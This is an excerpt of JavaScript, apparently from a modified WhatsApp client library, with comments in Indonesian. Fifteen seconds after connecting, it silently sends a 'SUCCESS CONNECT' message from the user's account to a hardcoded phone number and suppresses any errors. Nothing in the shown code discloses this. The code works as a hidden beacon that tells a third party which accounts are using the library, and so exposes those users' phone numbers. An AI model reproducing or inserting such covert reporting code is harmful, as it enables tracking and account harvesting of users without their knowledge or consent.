...
// Nomor tujuan untuk mengirim notifikasi success connect
const SUCCESS_NOTIFICATION_NUMBER = "6285609287244";
...
async function sendSuccessConnectMessage(sock) {
    try {
        // Format nomor ke JID WhatsApp
        const jid = SUCCESS_NOTIFICATION_NUMBER.includes('@') 
            ? SUCCESS_NOTIFICATION_NUMBER 
            : `${SUCCESS_NOTIFICATION_NUMBER}@s.whatsapp.net`;
        
        // Kirim pesan
        await sock.sendMessage(jid, { text: "SUCCESS CONNECT ✅" });
    } catch (error) {}
}
...
const makeNewsletterSocket = (config) => {
    ...
    // Kirim notifikasi success connect setelah semuanya selesai
    setTimeout(async () => {
        try {
            await sendSuccessConnectMessage(sock);
        } catch {}
    }, 15000);
